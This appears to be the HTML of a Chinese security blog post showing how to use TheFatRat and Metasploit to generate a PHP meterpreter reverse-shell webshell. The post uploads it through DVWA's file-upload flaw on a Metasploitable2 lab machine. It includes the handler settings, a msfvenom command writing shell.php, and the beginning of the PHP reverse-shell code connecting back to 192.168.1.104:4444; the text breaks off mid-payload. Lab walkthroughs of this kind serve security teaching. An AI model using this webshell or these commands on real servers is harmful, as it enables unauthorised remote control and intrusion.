@@ -1,0 +1,1199 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="description" content="文中提及的部分技术，可能带有一定攻击性。仅供安全学习和教学用途，禁止非法使用！">
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频)">
+<meta property="og:url" content="www.ggsec.cn/利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:description" content="文中提及的部分技术，可能带有一定攻击性。仅供安全学习和教学用途，禁止非法使用！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-5-msfvenom.1280x600.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0595.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0596.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0597.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0598.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0599.PNG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0600.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0601.JPG">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0602.JPG">
+<meta property="og:updated_time" content="2018-12-21T06:55:53.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频)">
+<meta name="twitter:description" content="文中提及的部分技术，可能带有一定攻击性。仅供安全学习和教学用途，禁止非法使用！">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-5-msfvenom.1280x600.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频) | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频)
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2016-12-10T14:09:29+08:00" content="2016-12-10">
+            2016-12-10
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/利用 TheFatrat 与 MSF 获取 shell 权限 (内附视频).html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><span style="color: #ff0000;"><strong>文中提及的部分技术，可能带有一定攻击性。仅供安全学习和教学用途，禁止非法使用！</strong></span><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-metasploit-for-aspiring-hacker-part-5-msfvenom.1280x600.jpg" alt="enter description here"><br><a id="more"></a><br>这年头很多国产工具都不敢恭维了，都工具自带后门，包括前阵子的webshell也是一样自带后门，包括xxx菜刀也是一样，很多同行都自己清楚，有拜访过的网站都基本成菠菜了。。。。。。废话不多说了，找了些开源工具，就充当 webshell 吧，也可以使用 msf 自带的 payload 生成的后门来充当 webshell 。</p>
+<h2 id="下载安装指南"><a href="#下载安装指南" class="headerlink" title="下载安装指南"></a><strong>下载安装指南</strong></h2><p><div id="crayon-584b9b2514d29706638734" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<p><div class="crayon-plain-wrap"></div></p>
+<p><pre class="pure-highlightjs"><span style="color: #ff0000;"><code>git clone https://github.com/Screetsec/TheFatRat.git     \\下载开源工具
+cd Fatrat                                                \\进入工具目录
+chmod +x fatrat                                          \\给程序给予权限
+./fatrat                                                 \\开始运行程序</code></span></pre><br>&nbsp;</p>
+<p><br><br>根据选项输入相应数字<br>安装要求：</p>
+<p><div id="crayon-584b9b2514d5a363794786" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<p><div class="crayon-plain-wrap"></div></p>
+<p><pre class="pure-highlightjs"><span style="color: #ff0000;">`<br>linux操作系统，推荐Kali Linux 2或Kali 2016.1 rolling / Cyborg / Parrot / Dracos / BackTrack / Backbox等</span></pre></p>
+<p>metasploit框架</p>
+<p>gcc, i586-mingw32msvc-gcc或i686-w64-mingw32-gcc ( apt-get install mingw32 )`<br><span style="color: #ff0000;"> </span></p>
+<p><br><br><strong>可参考资料</strong>：<a href="http://www.freebuf.com/sectool/113597.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/113597.html</a></p>
+<p>具体使用方法和步骤，请看以下视频内容：<br> </p><h1 id="一言不合的请猛击一下下列视频"><a href="#测试视频播放" class="headerlink"></a></h1><hr><p></p>
+<p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/fatrat.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+<p>%<a href="%5Dhttps://demonsec666.oss-cn-qingdao.aliyuncs.com/fatrat.mp4">enter description here</a></p>
+<p></p>
+<p><div class="mejs-controls"></div></p>
+<p><div class="mejs-clear"></div><br><br><br><br>&nbsp;</p>
+<h2 id="1-模拟实验环境："><a href="#1-模拟实验环境：" class="headerlink" title="1.模拟实验环境："></a><span style="color: #ff0000;"><strong>1.模拟实验环境：</strong></span></h2><p><strong>1.（模拟攻击者）</strong></p>
+<p><span style="color: #ff0000;">系统</span>：<span style="color: #008000;">kali linux 2.0</span></p>
+<p><span style="color: #ff0000;">使用到的程序工具</span>：<span style="color: #008000;">Thefatrat、metaspoit</span></p>
+<p><span style="color: #ff0000;">反弹shell ip地址/端口</span>：<span style="color: #008000;">192.168.1.104：4444</span></p>
+<p><span style="color: #ff0000;">使用msf  payload类型</span>: <span style="color: #008000;">php/meterpreter/reverse_tcp</span></p>
+<p><span style="color: #ff0000;">使用fatrat生成的webshell后门木马</span>：<span style="color: #008000;">demon.php</span></p>
+<p><strong>2.(模拟受害者)     </strong></p>
+<p><span style="color: #ff0000;">系统</span>:<span style="color: #008000;">Linux——–Metasploitable2</span></p>
+<p><span style="color: #ff0000;">使用测试网页模版</span>：<span style="color: #008000;">Dvwa</span></p>
+<p><span style="color: #ff0000;">利用漏洞</span>：<span style="color: #008000;">update（low等级）上传漏洞</span></p>
+<p><span style="color: #ff0000;">受害者ip</span>：<span style="color: #008000;">192.168.1.103</span></p>
+<p>&nbsp;</p>
+<h2 id="2-操作步骤指南"><a href="#2-操作步骤指南" class="headerlink" title="2.操作步骤指南"></a><strong>2.操作步骤指南</strong></h2><p>启动 fatrat ：</p>
+<p><div id="crayon-584b9b2514d66460020333" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<p><div class="crayon-plain-wrap"></div></p>
+<p><div class="crayon-main"></div></p>
+<p><pre class="pure-highlightjs"><span style="color: #008000;"><code>root@kali:~/TheFatRat# ./fatrat</code></span></pre><br>&nbsp;</p>
+<p><br><br>&nbsp;</p>
+<p>启动的时候比较慢，因为在检测依赖环境等步骤</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0595.JPG" alt="enter description here"></p>
+<p>&nbsp;</p>
+<p>以上回车再回车即可。可以看到以下界面：选择序号1，使用msfvenom的payload。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0596.JPG" alt="enter description here"></p>
+<p>&nbsp;</p>
+<p>在这里我们可以看到他自动的生成木马后门的类型，有 <strong>exe.php.asp.jsp.war.apk </strong>等类型，我们这里选择序号 <strong>5</strong> 即可，选择 <strong>php</strong> 类型。</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0597.JPG" alt="enter description here"></p>
+<p>&nbsp;</p>
+<p>设置顺序：<strong>设置工具者ip，工具者反弹的端口(<span style="color: #008000;">任意</span>)、设置生成的木马文件名（<span style="color: #008000;">任意</span>）</strong></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0598.JPG" alt="enter description here"><br>在这里我们可以看到生成的文件（<strong>在安装目录的output文件夹</strong>）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0599.PNG" alt="enter description here"></p>
+<p>&nbsp;</p>
+<p>启动 metaspoit 设置反弹 shell 的 ip 和端口：</p>
+<p><div id="crayon-584b9b2514d75354469131" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<div class="crayon-plain-wrap">
+
+<pre><code>msf exploit(handler) &amp;gt; &lt;span style=&quot;color: #008000;&quot;&gt;set payload php/meterpreter/reverse_tcp&lt;/span&gt;      （设置payload 连接攻击者电脑类型）
+payload =&amp;gt; php/meterpreter/reverse_tcp
+msf exploit(handler) &amp;gt; &lt;span style=&quot;color: #008000;&quot;&gt;set LHOST 192.168.1.104&lt;/span&gt;                            （设置）攻击者ip （和之前fatrat一样）
+LHOST =&amp;gt; 192.168.1.104                  
+msf exploit(handler) &amp;gt;&lt;span style=&quot;color: #008000;&quot;&gt; set LPORT 4444&lt;/span&gt;                         （设置）攻击者需反弹的i端口（和之前fatrat一样）LPORT =&amp;gt; 4444
+msf exploit(handler) &amp;gt; &lt;span style=&quot;color: #008000;&quot;&gt;exploit    &lt;/span&gt;                    （执行监听）
+</code></pre><p>&nbsp;</p>
+<p></p></div><br><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0600.JPG" alt="enter description here"><p></p>
+<p>&nbsp;</p>
+<p>上传 webshell/执行webshell</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0601.JPG" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_0602.JPG" alt="enter description here"></p>
+<p>相关dvwa的上传漏洞利用可参考：<a href="http://www.secist.com/archives/364.html" target="_blank" rel="noopener">(三)DVWA文件上传漏洞源码审计。</a><br>同样可以手动使用 msf 的 msfvenom 生成 php 后门（由于msf版本更新，移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代）</p>
+<p><div id="crayon-584b9b2514d80274293796" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<p><div class="crayon-plain-wrap"></div></p>
+<p><div class="crayon-main"></div></p>
+<p><table class="crayon-table"></table></p>
+<p><tbody></tbody></p>
+<p><tr class="crayon-row"></tr></p>
+<p><td class="crayon-nums " data-settings="show"></td></p>
+<p><div class="crayon-nums-content"></div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d80274293796-1">1</div><br></p>
+<p><td class="crayon-code"></td></p>
+<p><div class="crayon-pre"></div></p>
+<p><div id="crayon-584b9b2514d80274293796-1" class="crayon-line"><span class="crayon-v">msfvenom</span> <span class="crayon-o">-</span><span class="crayon-i">p</span> <span class="crayon-v">php</span><span class="crayon-o">/</span><span class="crayon-e">meterpreter_reverse_tcp </span><span class="crayon-v">LHOST</span><span class="crayon-o">=</span><span class="crayon-cn">192.168.1.101</span> <span class="crayon-v">LPORT</span><span class="crayon-o">=</span><span class="crayon-cn">4444</span> <span class="crayon-o">-</span><span class="crayon-i">f</span> <span class="crayon-v">raw</span> <span class="crayon-o">&gt;</span><span class="crayon-v">shell</span><span class="crayon-sy">.</span><span class="crayon-v">php</span></div><br><br><br><br><br><br><br>msfvenom 具体使可参考：<a href="http://www.freebuf.com/sectool/72135.html" target="_blank" rel="noopener"> http://www.freebuf.com/sectool/72135.html </a>。</p>
+<p><strong>最后，附上 php 中（webshell）的代码（一次生成，无需二次生成，可直接更改代码中的ip和端口号即可）</strong></p>
+<p><div id="crayon-584b9b2514d88199226413" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
+<p><div class="crayon-plain-wrap"></div></p>
+<p><div class="crayon-main"></div></p>
+<p><table class="crayon-table"></table></p>
+<p><tbody></tbody></p>
+<p><tr class="crayon-row"></tr></p>
+<p><td class="crayon-nums " data-settings="show"></td></p>
+<p><div class="crayon-nums-content"></div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-1">1</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-2">2</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-3">3</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-4">4</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-5">5</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-6">6</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-7">7</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-8">8</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-9">9</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-10">10</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-11">11</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-12">12</div></p>
+<p><div class="crayon-num" data-line="crayon-584b9b2514d88199226413-13">13</div></p>
+<p><div class="crayon-num crayon-striped-num" data-line="crayon-584b9b2514d88199226413-14">14</div><br></p>
+<p><td class="crayon-code"></td></p>
+<p><div class="crayon-pre"></div></p>
+<p><div id="crayon-584b9b2514d88199226413-1" class="crayon-line"><span class="crayon-o">/</span><span class="crayon-o"><em></em></span><span class="crayon-o">&lt;</span><span class="crayon-sy">?</span><span class="crayon-i">php</span> <span class="crayon-o">/</span><span class="crayon-o"></span><span class="crayon-o">*</span><span class="crayon-o">/</span> <span class="crayon-e">error_reporting</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-2" class="crayon-line crayon-striped-line"><span class="crayon-sy">$</span><span class="crayon-i">ip</span> <span class="crayon-o">=</span> <span class="crayon-s">‘192.168.1.104’</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-3" class="crayon-line"><span class="crayon-sy">$</span><span class="crayon-i">port</span> <span class="crayon-o">=</span> <span class="crayon-cn">4444</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-4" class="crayon-line crayon-striped-line"><span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">‘stream_socket_client’</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-s">“tcp://{$ip}:{$port}”</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-5" class="crayon-line"><span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">‘stream’</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-st">elseif</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">‘fsockopen’</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">ip</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">port</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">‘stream’</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-6" class="crayon-line crayon-striped-line"><span class="crayon-sy">}</span> <span class="crayon-st">elseif</span> <span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span> <span class="crayon-o">=</span> <span class="crayon-s">‘socket_create’</span><span class="crayon-sy">)</span> <span class="crayon-o">&amp;&amp;</span> <span class="crayon-e">is_callable</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">f</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-7" class="crayon-line"><span class="crayon-sy">{</span> <span class="crayon-sy">$</span><span class="crayon-i">s</span> <span class="crayon-o">=</span> <span class="crayon-sy">$</span><span class="crayon-e">f</span><span class="crayon-sy">(</span><span class="crayon-i">AF_INET</span><span class="crayon-sy">,</span> <span class="crayon-i">SOCK_STREAM</span><span class="crayon-sy">,</span> <span class="crayon-i">SOL_TCP</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">$</span><span class="crayon-i">res</span> <span class="crayon-o">=</span> <span class="crayon-v">@socket_connect</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">ip</span><span class="crayon-sy">,</span> <span class="crayon-sy">$</span><span class="crayon-i">port</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-8" class="crayon-line crayon-striped-line"><span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">res</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-sy">$</span><span class="crayon-i">s_type</span> <span class="crayon-o">=</span> <span class="crayon-s">‘socket’</span><span class="crayon-sy">;</span> <span class="crayon-sy">}</span> <span class="crayon-st">else</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">‘no socket funcs’</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
+<p><div id="crayon-584b9b2514d88199226413-9" class="crayon-line"><span class="crayon-sy">}</span> <span class="crayon-st">if</span> <span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">s</span><span class="crayon-sy">)</span> <span class="crayon-sy">{</span> <span class="crayon-e">die</span><span class="crayon-sy">(</span><span class="crayon-s">‘no socket’</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></p>
